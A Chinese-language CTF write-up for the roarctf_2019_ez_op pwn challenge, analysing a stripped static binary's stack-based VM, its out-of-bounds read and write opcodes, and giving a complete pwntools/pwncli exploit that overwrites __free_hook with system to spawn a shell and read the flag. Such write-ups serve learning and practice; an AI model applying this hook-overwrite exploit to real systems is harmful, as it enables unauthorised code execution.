# roarctf_2019_ez_op



### 总结

又是一道虚拟机的题，记录一下分析过程。虚拟机的题一般来说`exp`不会很复杂，但是分析起来需要时间。

<!-- more -->

### 题目分析

#### checksec

![image-20211211150120097](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211150120097.png)



主题到该文件是静态编译的，并且去除了符号。首先需要恢复一些符号，静态编译去符号文件的恢复可以参考[这篇博客](https://blog.csdn.net/Breeze_CAT/article/details/103788796)。根据教程一步步恢复即可，实在恢复不了的呢，可以用`strace`或者`gdb`之类的工具动态调试一下，然后大概猜一下函数的功能。毕竟常用的函数就那么几个。

#### 函数分析

首先恢复一下结构体：

```c
struct Block{
	int *stack_ptr;
    int size;
    int sp;
};
```

##### main

![image-20211211152836163](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211152836163.png)

##### do_malloc

![image-20211211152914142](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211152914142.png)

就是在分配结构体，然后分配内存，刷新`size`和`sp`

##### copy_value

![image-20211211152943679](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211152943679.png)

拷贝输入到前面分配的两个`block`中

##### do_vm

![image-20211211154343941](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211154343941.png)

这里的流程比较多，逐个分析，首先将前面分配的两个`block`以此命名为：`use_block`和`opcode_block`，还有一个临时变量，命名为`tmp_block`。

主要的流程如下：

```
首先从opcode_block的stack中pop出一个值，赋值给opcode，判断是否进入下面的分支：
当opcode为：
	0x10101010：
		v1 = tmp_block.pop()
		v2 = tmp_block.pop()
		tmp_block->stack_ptr[tmp_block->sp+v1] = v2 // 这里存在溢出写
	0xFFFF28：
		v = tmp_block.pop()
		use_block.push(v)
	0xABCEF:
		v1 = tmp_block.pop()
		v2 = tmp_block.pop()
		tmp_block.push(v1 * v2)
	0x11111:
		v1 = tmp_block.pop()
		v2 = tmp_block.pop()
		tmp_block.push(v1 - v2)
	0x2A3D:
		v = use_block.pop()
		tmp_block.push(v)
	0x514:
		v1 = tmp_block.pop()
		v2 = tmp_block.pop()
		tmp_block.push(v1 / v2)
	-1:
		v = tmp_block.pop()
		v1 = tmp_block->stack_ptr[tmp_block->sp + v]
		tmp_block.push(v1) // 这里存在溢出读
	0:
		v1 = tmp_block.pop()
		v2 = tmp_block.pop()
		tmp_block.push(v1 + v2)
		
执行完成后，释放tmp_block
```

### 利用思路

将虚拟机的执行流程分析完后，利用思路有很多，我的思路为：

- 调试可知，`tmp_block`的`stack_ptr`地址要低于`tmp_block`的地址。利用`0x10101010`的溢出，将`tmp_block->stack_ptr`修改为`__free_hook-0x8`
- 利用`use2tmp`，将`__free_hook-0x8`的内容填充为`/bin/sh\x00\x00\x00`+`p64(system)`
- 最后释放`tmp_block`的是时候，会执行`system(""/bin/sh")`

在静态编译的`ELF`文件中寻找`system`函数有个小技巧，寻找`exit 0`字符串：

![image-20211211155928001](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211155928001.png)

即可找到`system`地址如下：

![image-20211211160037722](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211160037722.png)



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *

cli_script()

io: tube = gift['io']

free_hook_addr = 0x80e09f0
system_addr = 0x8051c60

def get_payload(int_list):
    res = ""
    for i in int_list:
        res += str(i) + " "
    res = res.rstrip()
    info(f"Get payload: {res}")
    return res

opcodes = [0x2a3d, 0x2a3d, 0x10101010, 0x2a3d, 0x2a3d, 0x2a3d]
uses = [free_hook_addr - 8, 0x45, 0x6e69622f, 0x68732f, system_addr]

io.sendline(get_payload(opcodes))
sleep(1)
io.sendline(get_payload(uses))

sleep(1)
io.sendline("cat /flag")

io.interactive()
```

![image-20211211160647000](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211211160647000.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-12-11-roarctf-2019-ez-op/  

